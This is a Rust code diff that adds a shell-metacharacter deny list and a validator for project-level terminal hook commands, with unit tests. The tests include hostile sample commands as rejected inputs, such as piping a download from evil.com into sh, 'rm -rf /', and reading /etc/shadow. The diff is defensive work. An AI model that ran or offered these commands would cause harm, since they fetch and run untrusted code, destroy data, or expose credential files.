@@ -879,15 +879,41 @@ pub fn resolve_terminal_on_create_simple(
     resolve_hook_with_parent(project_hooks, parent_hooks, global_hooks, |h| &h.terminal.on_create)
 }
 
+/// Dangerous shell metacharacters that could be used for injection.
+/// We reject hook commands from project-level settings that contain these,
+/// since they could chain or redirect arbitrary commands.
+const DANGEROUS_SHELL_PATTERNS: &[&str] = &[";", "&&", "||", "|", "`", "$(", ">", "<"];
+
+/// Validate that a hook command does not contain shell injection metacharacters.
+/// Project-level hooks from untrusted repos could abuse these to run arbitrary commands.
+/// Returns `Ok(())` if the command is safe, or `Err` with a description of what was rejected.
+pub fn validate_hook_command(cmd: &str) -> Result<(), String> {
+    for pattern in DANGEROUS_SHELL_PATTERNS {
+        if cmd.contains(pattern) {
+            return Err(format!(
+                "hook command contains dangerous shell metacharacter '{}': {}",
+                pattern, cmd
+            ));
+        }
+    }
+    Ok(())
+}
+
 /// Apply the `terminal.on_create` command by wrapping the shell to run
 /// the command first, then `exec` into the original shell.
 /// Environment variables are exported so they persist in the shell session.
 /// Produces: `sh -c 'export K=V; ...; <on_create_cmd>; exec <shell_cmd>'`
-pub fn apply_on_create(shell: &ShellType, on_create_cmd: &str, env_vars: &HashMap<String, String>) -> ShellType {
+///
+/// Returns `None` if the command fails validation (shell injection detected).
+pub fn apply_on_create(shell: &ShellType, on_create_cmd: &str, env_vars: &HashMap<String, String>) -> Option<ShellType> {
+    if let Err(e) = validate_hook_command(on_create_cmd) {
+        log::warn!("Skipping terminal.on_create hook: {}", e);
+        return None;
+    }
     let shell_cmd = shell.to_command_string();
     let prefix = build_export_prefix(env_vars);
     let script = format!("{}{}; exec {}", prefix, on_create_cmd, shell_cmd);
-    ShellType::for_command(script)
+    Some(ShellType::for_command(script))
 }
 
 /// Fire the `terminal.on_close` hook after a terminal PTY exits.
@@ -1216,7 +1242,7 @@ mod tests {
         };
         let mut env = HashMap::new();
         env.insert("OKENA_PROJECT_ID".into(), "proj-123".into());
-        let result = apply_on_create(&shell, "echo hello", &env);
+        let result = apply_on_create(&shell, "echo hello", &env).expect("should pass validation");
         match &result {
             ShellType::Custom { path: _, args } => {
                 let cmd = &args[1];
@@ -1226,6 +1252,60 @@ mod tests {
             }
             other => panic!("Expected ShellType::Custom, got: {:?}", other),
         }
+    }
+
+    #[test]
+    fn validate_hook_command_allows_simple_commands() {
+        assert!(validate_hook_command("nvm use").is_ok());
+        assert!(validate_hook_command("source .env").is_ok());
+        assert!(validate_hook_command("cd /some/path").is_ok());
+        assert!(validate_hook_command("export FOO=bar").is_ok());
+    }
+
+    #[test]
+    fn validate_hook_command_rejects_pipe_injection() {
+        assert!(validate_hook_command("curl evil.com | sh").is_err());
+    }
+
+    #[test]
+    fn validate_hook_command_rejects_semicolon_injection() {
+        assert!(validate_hook_command("cmd; rm -rf /").is_err());
+    }
+
+    #[test]
+    fn validate_hook_command_rejects_and_chain() {
+        assert!(validate_hook_command("true && curl evil.com").is_err());
+    }
+
+    #[test]
+    fn validate_hook_command_rejects_or_chain() {
+        assert!(validate_hook_command("false || curl evil.com").is_err());
+    }
+
+    #[test]
+    fn validate_hook_command_rejects_backtick_injection() {
+        assert!(validate_hook_command("`malicious`").is_err());
+    }
+
+    #[test]
+    fn validate_hook_command_rejects_subshell_injection() {
+        assert!(validate_hook_command("$(curl evil.com)").is_err());
+    }
+
+    #[test]
+    fn validate_hook_command_rejects_redirect() {
+        assert!(validate_hook_command("echo data > /etc/passwd").is_err());
+        assert!(validate_hook_command("cat < /etc/shadow").is_err());
+    }
+
+    #[test]
+    fn apply_on_create_skips_invalid_command() {
+        let shell = ShellType::Custom {
+            path: "/bin/bash".to_string(),
+            args: vec![],
+        };
+        let env = HashMap::new();
+        assert!(apply_on_create(&shell, "curl evil.com | sh", &env).is_none());
     }
 
     #[test]
